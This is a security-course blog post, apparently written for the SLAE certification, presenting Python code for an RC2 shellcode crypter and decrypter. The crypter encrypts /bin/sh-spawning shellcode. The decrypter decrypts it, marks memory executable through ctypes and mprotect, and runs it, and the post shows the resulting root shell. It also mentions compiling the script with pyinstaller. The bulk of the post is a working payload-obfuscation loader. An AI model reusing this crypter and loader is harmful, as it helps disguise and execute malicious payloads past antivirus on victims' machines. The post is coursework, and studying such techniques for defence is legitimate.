Introduction
------------
RC2 is a symmetric-key block cipher which was popular in the first half of the 90s of the last century. RC2 also known as ARC2 was designed by Ron Rivest of RSA Security in 1987. Without going into too much details, RC2 consist of block size and key length amongst others things (more on that later). In this blog post, we’ll create RC2 shellcode crypter/decrpter to demonstrate the concept. Please note that I’m no RC2 expert and this blog post is by no means an overview of RC2 algorithm.

Crypter
-------
In order to create RC2 crypter there is couple of thing we need to figure out ahead of time. That is, key-length which can range from 8 to 1024 bits, cipher-mode which can be either ECB or CBC, and the secret key. We’ll use key length of `128-bits` and CBC as cipher mode which require an Initialization Vector. Here’s code referenced from [Chilkat](https://www.chilkatsoft.com/), will use the comments section to explain the process.

```python
import sys
import chilkat

# Define RC2 parameters
crypt = chilkat.CkCrypt2()
success = crypt.UnlockComponent("Anything for 30-day trial")
if (success != True):
    print(crypt.lastErrorText())
    sys.exit()

crypt.put_CryptAlgorithm("rc2")                                                  # set the encryption algorithm to "rc2"
crypt.put_CipherMode("cbc")                                                      # set cipher mode to "cbc"
crypt.put_KeyLength(128)                                                         # set key length 128-bit
crypt.put_Rc2EffectiveKeyLength(128)                                             #
crypt.put_PaddingScheme(0)                                                       # take care of padding
crypt.put_EncodingMode("hex")                                                    # set encoding mode to HEX
ivHex = "0001020304050607"                                                       # setup initialization vector for CBC mode.
crypt.SetEncodedIV(ivHex,"hex")                                                  # set encoding to HEX
keyHex = "000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F"      # set secret key 128-bit
crypt.SetEncodedKey(keyHex,"hex")

# "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80", https://www.exploit-db.com/exploits/43735/
Encrypted_Shellcode = crypt.encryptStringENC("31c05089e2682f2f7368682f62696e89e350b00bcd80")  # encrypt shellcode in string NOT bytearray format
print "Encrypted Shellcode: " + Encrypted_Shellcode                                           # print encrypted shellcode
```

the above shellcode basically spawn shell for us and can be found [here](https://www.exploit-db.com/exploits/43735/). Let’s test it.

```sh
root@ubuntu:~# python RC2Crypter.py 
Encrypted Shellcode: F6F233BA271278F19E34812CC2B7ACD19385C2E7A6D477A4C72E71BF669540944E9E36B252321DB05BD96EE0223E5481
root@ubuntu:~#
```

Decrypter
---------
Hence RC2 is a symmetric-key algorithm meaning the same key is used for encryption and decryption, there is nothing much to it really other than reversing the process of encryption. All of the code used to execute the shellcode at run time can be found [here](http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html).

```python
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import sys
import chilkat

# Define RC2 parameters
crypt = chilkat.CkCrypt2()
success = crypt.UnlockComponent("Anything for 30-day trial")
if (success != True):
    print(crypt.lastErrorText())
    sys.exit()

crypt.put_CryptAlgorithm("rc2")                                                  # set the encryption algorithm to "rc2"
crypt.put_CipherMode("cbc")                                                      # set cipher mode to "cbc"
crypt.put_KeyLength(128)                                                         # set key length 128-bit
crypt.put_Rc2EffectiveKeyLength(128)                                             #
crypt.put_PaddingScheme(0)                                                       # take care of padding
crypt.put_EncodingMode("hex")                                                    # set encoding mode to HEX
ivHex = "0001020304050607"                                                       # setup initialization vector for CBC mode.
crypt.SetEncodedIV(ivHex,"hex")                                                  # set encoding to HEX
keyHex = "000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F"      # set secret key 128-bit
crypt.SetEncodedKey(keyHex,"hex")

# decrypt shellcode, paste encrypted shellcode here
Encrypted_Shellcode = "F6F233BA271278F19E34812CC2B7ACD19385C2E7A6D477A4C72E71BF669540944E9E36B252321DB05BD96EE0223E5481"
Decrypted_Shellcode = crypt.decryptStringENC(Encrypted_Shellcode)                # decrypt shellcode

# execute decrypted shellcode
libc = CDLL('libc.so.6')
shellcode = Decrypted_Shellcode.decode('hex')
sc = c_char_p(shellcode)
size = len(shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
```

Let's test.

```sh
root@ubuntu:~# python RC2Decrypter.py 
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

Its demo time! we’ll use `pyinstaller` to compile the python script.

[![Crypter/Decrypter Demo](https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/chmod.png)](https://player.vimeo.com/video/253265228?dnt=1&app_id=122963 "Click to Watch!")

Closing Thoughts
----------------
While researching crypters/decrypters, I found most of the blog posts out there were using C wrappers, so for the sake of not making a redundant one I decided to use python wrapper. This post marks the end of my SLAE journey in which I learned how little did I know and how much I still need to learn. Thank you Vivek Ramachandran and the people who helped make this course available! feel free to contact me for questions via twitter [@ihack4falafel](https://twitter.com/ihack4falafel).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1115

Github Repo: [https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%207](https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%207)
